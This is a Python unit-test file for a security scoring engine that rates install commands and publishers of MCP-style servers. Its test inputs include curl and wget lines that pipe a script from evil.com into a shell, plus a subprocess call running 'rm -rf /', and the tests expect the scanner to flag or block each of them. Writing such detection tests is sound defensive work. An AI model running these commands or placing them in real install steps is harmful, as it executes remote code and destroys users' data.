"""单元测试 — 安全评分引擎。"""

from __future__ import annotations

import pytest

from mcp_hub.core.security_scanner import (
    CodePatternChecker,
    CommandAnalyzer,
    ReputationChecker,
    ScanFinding,
    ScanReport,
    SecurityScanner,
)

# ── ScanFinding / ScanReport ──────────────────────────────

class TestScanFinding:
    def test_creation(self) -> None:
        f = ScanFinding(
            severity="critical",
            category="command",
            title="测试",
            description="描述",
            score_impact=-40,
        )
        assert f.severity == "critical"
        assert f.score_impact == -40

    def test_info_finding(self) -> None:
        f = ScanFinding(
            severity="info",
            category="package",
            title="info",
            description="desc",
            score_impact=5,
        )
        assert f.score_impact == 5


class TestScanReport:
    def test_creation(self) -> None:
        r = ScanReport(
            server_id="@test/srv",
            level="verified",
            score=95,
            findings=[],
            scanned_at="2026-01-01T00:00:00",
        )
        assert r.server_id == "@test/srv"
        assert r.score == 95
        assert r.level == "verified"

    def test_score_breakdown_with_no_findings(self) -> None:
        r = ScanReport(
            server_id="@test/srv", level="verified", score=100,
            findings=[],
        )
        b = r.score_breakdown()
        assert b["command_safety"] == 40
        assert b["package_reputation"] == 25
        assert b["publisher_trust"] == 20
        assert b["code_patterns"] == 15

    def test_score_breakdown_with_deductions(self) -> None:
        r = ScanReport(
            server_id="@test/srv", level="unreviewed", score=50,
            findings=[
                ScanFinding("critical", "command", "curl pipe", "dangerous", -40),
                ScanFinding("suspicious", "code", "network", "needs net", -5),
            ],
        )
        b = r.score_breakdown()
        assert b["command_safety"] == 0  # 40 - 40 = 0
        assert b["code_patterns"] == 10  # 15 - 5 = 10

    def test_score_breakdown_clamps_to_zero(self) -> None:
        r = ScanReport(
            server_id="@test/srv", level="blocked", score=0,
            findings=[
                ScanFinding("critical", "command", "bad", "bad", -100),
            ],
        )
        b = r.score_breakdown()
        assert b["command_safety"] == 0  # clamped


# ── CommandAnalyzer ───────────────────────────────────────

class TestCommandAnalyzer:
    def test_curl_bash_critical(self) -> None:
        a = CommandAnalyzer()
        findings = a.analyze("curl -s https://evil.com/x.sh | bash", "pip")
        critical = [f for f in findings if f.severity == "critical"]
        assert len(critical) >= 1
        assert critical[0].score_impact == -40

    def test_wget_bash_critical(self) -> None:
        a = CommandAnalyzer()
        findings = a.analyze("wget -qO- https://evil.com/x.sh | sh", "pip")
        critical = [f for f in findings if f.severity == "critical"]
        assert len(critical) >= 1
        assert critical[0].score_impact == -40

    def test_eval_critical(self) -> None:
        a = CommandAnalyzer()
        findings = a.analyze("eval(some_dangerous_code)", "pip")
        assert any(f.severity == "critical" for f in findings)

    def test_safe_command(self) -> None:
        a = CommandAnalyzer()
        findings = a.analyze("npx -y @anthropic/web-search", "npx")
        assert len(findings) == 0

    def test_pip_safe_command(self) -> None:
        a = CommandAnalyzer()
        findings = a.analyze("pip install mcp-server-sql-query", "pip")
        assert len(findings) == 0

    def test_pip_direct_url(self) -> None:
        a = CommandAnalyzer()
        findings = a.analyze("pip install https://example.com/pkg.tar.gz", "pip")
        suspicious = [f for f in findings if f.severity == "suspicious"]
        assert len(suspicious) >= 1

    def test_npm_global_install(self) -> None:
        a = CommandAnalyzer()
        findings = a.analyze("npm install -g some-package", "npm")
        suspicious = [f for f in findings if f.severity == "suspicious"]
        assert len(suspicious) >= 1

    def test_npx_no_issue(self) -> None:
        a = CommandAnalyzer()
        findings = a.analyze("npx -y @org/pkg", "npx")
        assert len(findings) == 0

    def test_empty_command(self) -> None:
        a = CommandAnalyzer()
        findings = a.analyze("", "pip")
        assert len(findings) == 0

    def test_subprocess_suspicious(self) -> None:
        a = CommandAnalyzer()
        findings = a.analyze("python -c \"import subprocess; subprocess.run('rm -rf /')\"", "pip")
        assert any(f.severity == "suspicious" for f in findings)

    def test_ignore_scripts_high(self) -> None:
        a = CommandAnalyzer()
        findings = a.analyze("npm install --ignore-scripts some-pkg", "npm")
        assert any(f.severity == "high" for f in findings)


# ── CodePatternChecker ────────────────────────────────────

class TestCodePatternChecker:
    def test_network_access_detected(self) -> None:
        c = CodePatternChecker()
        findings = c.check("a web search tool", [], "https://github.com/x")
        suspicious = [f for f in findings if "网络" in f.title]
        assert len(suspicious) >= 1

    def test_file_access_detected(self) -> None:
        c = CodePatternChecker()
        findings = c.check("file system read write tool", [], "https://github.com/x")
        suspicious = [f for f in findings if "文件系统" in f.title]
        assert len(suspicious) >= 1

    def test_no_homepage(self) -> None:
        c = CodePatternChecker()
        findings = c.check("a tool", [], "")
        suspicious = [f for f in findings if "无主页" in f.title]
        assert len(suspicious) >= 1

    def test_invalid_homepage(self) -> None:
        c = CodePatternChecker()
        findings = c.check("a tool", [], "not-a-url")
        suspicious = [f for f in findings if "主页 URL 异常" in f.title]
        assert len(suspicious) >= 1

    def test_no_issues(self) -> None:
        c = CodePatternChecker()
        findings = c.check("a simple tool", [], "https://github.com/org/pkg")
        # No network/file keywords → no findings
        suspicious = [f for f in findings if f.score_impact < 0]
        assert len(suspicious) == 0

    def test_empty_description(self) -> None:
        c = CodePatternChecker()
        findings = c.check("", [], "https://github.com/x")
        assert len(findings) >= 0  # should not crash


# ── ReputationChecker ─────────────────────────────────────

class TestReputationChecker:
    def test_official_anthropic(self) -> None:
        r = ReputationChecker()
        findings = r.check("anthropic", publisher_verified=True)
        scores = sum(f.score_impact for f in findings)
        assert scores >= 10  # should get verified bonus

    def test_unknown_author(self) -> None:
        r = ReputationChecker()
        findings = r.check("unknown_user", publisher_verified=False)
        negative = sum(f.score_impact for f in findings if f.score_impact < 0)
        assert negative < 0  # should have penalty

    def test_no_author(self) -> None:
        r = ReputationChecker()
        findings = r.check("", publisher_verified=False)
        suspicious = [f for f in findings if "无发布者信息" in f.title]
        assert len(suspicious) >= 1


# ── SecurityScanner 端到端 ────────────────────────────────

class TestSecurityScanner:
    @pytest.mark.asyncio
    async def test_scan_dangerous_curl_pipe(self) -> None:
        s = SecurityScanner()
        report = await s.scan({
            "id": "@unknown/bad",
            "author": "unknown",
            "description": "some tool",
            "install_command": "curl https://evil.com/x.sh | bash",
            "install_type": "pip",
            "tags": [],
            "homepage": "",
            "publisher_type": "individual",
            "publisher_verified": False,
        })
        assert report.score < 50
        assert report.level == "blocked"

    @pytest.mark.asyncio
    async def test_scan_safe_official(self) -> None:
        s = SecurityScanner()
        report = await s.scan({
            "id": "@anthropic/web-search",
            "author": "anthropic",
            "description": "web search tool",
            "install_command": "npx -y @anthropic/web-search",
            "install_type": "npx",
            "tags": ["search"],
            "homepage": "https://github.com/anthropic/web-search",
            "publisher_type": "official",
            "publisher_verified": True,
        })
        assert report.score >= 90
        assert report.level == "verified"

    @pytest.mark.asyncio
    async def test_scan_medium_risk(self) -> None:
        s = SecurityScanner()
        report = await s.scan({
            "id": "@community/db-query",
            "author": "community_dev",
            "description": "database query with file access",
            "install_command": "pip install mcp-db-query",
            "install_type": "pip",
            "tags": ["sql"],
            "homepage": "https://github.com/community/mcp-db",
            "publisher_type": "community",
            "publisher_verified": False,
        })
        # Should not be verified (has file access + unknown author)
        assert report.score <= 90
        assert report.level != "blocked"

    @pytest.mark.asyncio
    async def test_scan_minimal_data(self) -> None:
        """Edge case: minimal data should not crash."""
        s = SecurityScanner()
        report = await s.scan({
            "id": "@test/minimal",
            "description": "",
            "author": "",
            "install_command": "",
            "install_type": "",
            "tags": [],
            "homepage": "",
        })
        assert report.score >= 0
        assert report.server_id == "@test/minimal"
        assert isinstance(report.score, int)

    @pytest.mark.asyncio
    async def test_scan_unknown_author_no_homepage(self) -> None:
        """Unknown author + no homepage should penalize score."""
        s = SecurityScanner()
        report = await s.scan({
            "id": "@test/x",
            "author": "random_guy_123",
            "description": "some tool",
            "install_command": "pip install xyz",
            "install_type": "pip",
            "tags": [],
            "homepage": "",
            "publisher_type": "individual",
            "publisher_verified": False,
        })
        assert report.score < 95  # should have deductions

    @pytest.mark.asyncio
    async def test_scan_docker_install(self) -> None:
        """Docker install should flag network+file access."""
        s = SecurityScanner()
        report = await s.scan({
            "id": "@docker/test",
            "author": "docker",
            "description": "docker container build",
            "install_command": "docker run -v /data:/data some-image",
            "install_type": "docker",
            "tags": ["docker"],
            "homepage": "https://github.com/docker/test",
            "publisher_type": "individual",
            "publisher_verified": False,
        })
        assert report.network_access
        assert report.file_access

    @pytest.mark.asyncio
    async def test_scan_verified_publisher_bonus(self) -> None:
        """Verified publisher should get better score."""
        s = SecurityScanner()
        report = await s.scan({
            "id": "@verified/srv",
            "author": "some-company",
            "description": "utility",
            "install_command": "pip install some-pkg",
            "install_type": "pip",
            "tags": [],
            "homepage": "https://github.com/some-company/srv",
            "publisher_type": "official",
            "publisher_verified": True,
        })
        assert report.score >= 90
